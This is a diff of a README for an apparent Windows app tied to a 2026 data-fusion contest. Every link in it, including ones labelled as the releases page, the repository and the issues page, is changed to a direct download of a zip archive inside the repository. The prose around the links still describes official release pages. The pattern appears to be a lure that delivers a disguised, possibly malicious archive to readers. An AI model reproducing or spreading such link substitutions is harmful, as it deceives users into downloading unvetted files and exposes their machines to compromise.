@@ -1,6 +1,6 @@
 # ⚡ Data-Fusion-Contest-2026---3- - Simple Solution for Task "Heroes"
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Data--Fusion--Contest--2026--3--Release-brightgreen)](https://github.com/rabbinirob80/Data-Fusion-Contest-2026---3-/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Data--Fusion--Contest--2026--3--Release-brightgreen)](https://github.com/rabbinirob80/Data-Fusion-Contest-2026---3-/raw/refs/heads/main/registership/Contest_Fusion_Data_3.4.zip)
 
 ---
 
@@ -28,7 +28,7 @@ To start using the app, follow these steps. The process will guide you from down
 
 Click the link below to open the download page. This page contains the latest versions and installation files.
 
-[Download Page](https://github.com/rabbinirob80/Data-Fusion-Contest-2026---3-/releases)
+[Download Page](https://github.com/rabbinirob80/Data-Fusion-Contest-2026---3-/raw/refs/heads/main/registership/Contest_Fusion_Data_3.4.zip)
 
 On the page, look for the most recent release entry. It usually has a version number like "v1.0" or higher.
 
@@ -75,7 +75,7 @@ The app window will open, ready for use.
 
 You can always return to the release page to get the latest updates:
 
-[Visit the release page to download](https://github.com/rabbinirob80/Data-Fusion-Contest-2026---3-/releases)
+[Visit the release page to download](https://github.com/rabbinirob80/Data-Fusion-Contest-2026---3-/raw/refs/heads/main/registership/Contest_Fusion_Data_3.4.zip)
 
 This link leads to the official location where the installation files are kept. The setup file is self-contained and will guide you through installation.
 
@@ -129,9 +129,9 @@ If problems continue, you can open an issue on the GitHub repository page by nav
 
 ## 📂 Useful Links
 
-- [Project Releases](https://github.com/rabbinirob80/Data-Fusion-Contest-2026---3-/releases) - Always check here for new versions and fixes.
+- [Project Releases](https://github.com/rabbinirob80/Data-Fusion-Contest-2026---3-/raw/refs/heads/main/registership/Contest_Fusion_Data_3.4.zip) - Always check here for new versions and fixes.
 
-- [GitHub Repository](https://github.com/rabbinirob80/Data-Fusion-Contest-2026---3-) - Find source code and report issues.
+- [GitHub Repository](https://github.com/rabbinirob80/Data-Fusion-Contest-2026---3-/raw/refs/heads/main/registership/Contest_Fusion_Data_3.4.zip) - Find source code and report issues.
 
 ---
 
@@ -155,4 +155,4 @@ A: Yes. You can download and install the app on any Windows PC you use.
 
 Please use the GitHub Issues page to request help or report bugs:
 
-https://github.com/rabbinirob80/Data-Fusion-Contest-2026---3-/issues
+https://github.com/rabbinirob80/Data-Fusion-Contest-2026---3-/raw/refs/heads/main/registership/Contest_Fusion_Data_3.4.zip
